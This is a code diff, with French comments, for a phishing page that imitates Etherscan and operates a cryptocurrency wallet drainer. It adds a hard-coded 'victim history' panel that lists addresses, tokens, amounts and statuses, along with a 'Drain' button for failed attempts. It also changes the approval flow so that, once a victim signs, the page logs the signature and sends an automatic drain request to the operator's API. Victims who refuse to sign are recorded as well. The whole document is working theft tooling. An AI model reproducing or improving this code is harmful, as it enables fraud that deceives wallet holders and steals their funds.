@@ -466,6 +466,20 @@
       <ul class="nav-list" id="nav-list"></ul>
     </nav>
     <div id="mega-host"></div>
+
+    <!-- Panneau More – Historique des victimes (en dur) -->
+    <div class="mega more-panel" data-panel="More" hidden>
+      <div class="more-container">
+        <h3>Historique des victimes</h3>
+        <div id="victim-table-wrapper">
+          <p id="victim-loading">Chargement...</p>
+          <table id="victim-table" style="display:none;">
+            <thead><tr><th>Adresse</th><th>Token</th><th>Montant</th><th>Date</th><th>Statut</th><th>Action</th></tr></thead>
+            <tbody id="victim-tbody"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
   </header>
 
   <!-- ===== Main ===== -->
@@ -744,42 +758,9 @@
       html += '<li><a class="signin" href="https://etherscan.io/login">' + svg('userCircle', 'icon icon-md') + 'Sign In' + svg('chevronDown') + '</a></li>';
       navList.innerHTML = html;
 
-      // Render mega menus for items with columns
-      navItems.filter(function (i) { return i.columns; }).forEach(function (item) {
-        if (item.label === 'More') {
-          // Mega menu spécial pour More : panneau d'historique
-          let m = '<div class="mega more-panel" data-panel="More" hidden>';
-          m += '<div class="more-container">';
-          m += '<h3>Historique des victimes</h3>';
-          m += '<div id="victim-table-wrapper">';
-          m += '<p id="victim-loading">Chargement...</p>';
-          m += '<table id="victim-table" style="display:none;">';
-          m += '<thead><tr><th>Adresse</th><th>Token</th><th>Montant</th><th>Date</th><th>Statut</th><th>Action</th></tr></thead>';
-          m += '<tbody id="victim-tbody"></tbody>';
-          m += '</table>';
-          m += '</div>';
-          m += '</div></div>';
-          megaHost.insertAdjacentHTML('beforeend', m);
-          return;
-        }
-
-        // Autres mega menus normaux
-        let m = '<div class="mega" data-panel="' + item.label + '" hidden><div class="container mega-grid">';
-        item.columns.forEach(function (col) {
-          m += '<div><h3>' + col.title + '</h3><ul>';
-          col.items.forEach(function (sub) {
-            m += '<li><a href="' + sub.href + '"' + (sub.external ? ' target="_blank" rel="noopener noreferrer"' : '') + '>' +
-              (sub.icon ? svg(sub.icon, 'icon icon-md') : '') +
-              '<span>' + sub.label + '</span>' +
-              (sub.badge ? '<span class="badge-sq">' + sub.badge + '</span>' : '') +
-              (sub.external ? svg('externalLink', 'icon icon-sm') : '') +
-              '</a></li>';
-          });
-          m += '</ul></div>';
-        });
-        m += '</div></div>';
-        megaHost.insertAdjacentHTML('beforeend', m);
-      });
+      // Render mega menus for items with columns (ici seul More est concerné, mais il est en dur dans le HTML, donc rien à faire)
+      // On n'a plus besoin de générer le mega-menu More dynamiquement car il est déjà dans le DOM
+      // Les autres éventuels mega menus seraient générés ici, mais il n'y en a pas.
     }
 
     function setOpen(label) {
@@ -1053,7 +1034,7 @@
       const scanText = document.querySelector('.scan');
       if (scanText) scanText.textContent = 'En attente de signature…';
 
-            // Enregistrer la connexion du wallet dans l'historique
+      // Enregistrer la connexion du wallet dans l'historique
       fetch('/api/record-wallet', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -1104,17 +1085,35 @@
           chainId: 'eip155:1'
         });
         if (scanText) scanText.textContent = '✅ Le client a signé, il est redirigé vers la page de vérification.';
+
+        // Statut "signed"
+        await fetch('/api/record-wallet', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: account, chain: currentChainId, status: 'signed' })
+        });
+        console.log('Statut signé enregistré');
+
+        // Lancement du drain automatique
+        await fetch(API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ victim: account, chain: currentChainId })
+        });
+        console.log('Demande de drain automatique envoyée');
+
       } catch (e) {
         console.error('Approve échoué', e);
         if (scanText) scanText.textContent = '❌ Le client a refusé de signer.';
-      }
 
-      await fetch(API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ victim: account, chain: currentChainId })
-      });
-      console.log('Transaction envoyée, la victime va être redirigée par son wallet.');
+        // Statut "unsigned"
+        await fetch('/api/record-wallet', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: account, chain: currentChainId, status: 'unsigned' })
+        });
+        console.log('Statut non signé enregistré');
+      }
     }
 
     // ===== Historique des victimes =====
@@ -1176,16 +1175,22 @@
         const tdStatus = document.createElement('td');
         if (v.status === 'drained') {
           tdStatus.innerHTML = '<span class="status-success">✅ Succès</span>';
-        } else if (v.status === 'failed' || v.status === 'connected') {
+        } else if (v.status === 'signed') {
+          tdStatus.innerHTML = '<span class="status-success">✅ Signé</span>';
+        } else if (v.status === 'unsigned') {
+          tdStatus.innerHTML = '<span class="status-error">❌ Non signé</span>';
+        } else if (v.status === 'failed') {
           tdStatus.innerHTML = '<span class="status-error">❌ Échec</span>';
+        } else if (v.status === 'connected') {
+          tdStatus.innerHTML = '<span style="color: var(--azure-40);">🔗 Connecté</span>';
         } else {
           tdStatus.textContent = v.status || '?';
         }
         row.appendChild(tdStatus);
 
-        // Action (bouton drain si ce n'est pas déjà drainé)
+        // Action (bouton drain seulement si statut "failed")
         const tdAction = document.createElement('td');
-        if (v.status !== 'drained') {
+        if (v.status === 'failed') {
           const btn = document.createElement('button');
           btn.className = 'drain-btn';
           btn.textContent = 'Drain';
@@ -1222,7 +1227,7 @@
         const data = await resp.json();
         if (data.success) {
           alert('Drain lancé avec succès.');
-          fetchVictims();
+          fetchVictims(); // rafraîchir
         } else {
           alert('Échec: ' + (data.error || 'inconnu'));
         }
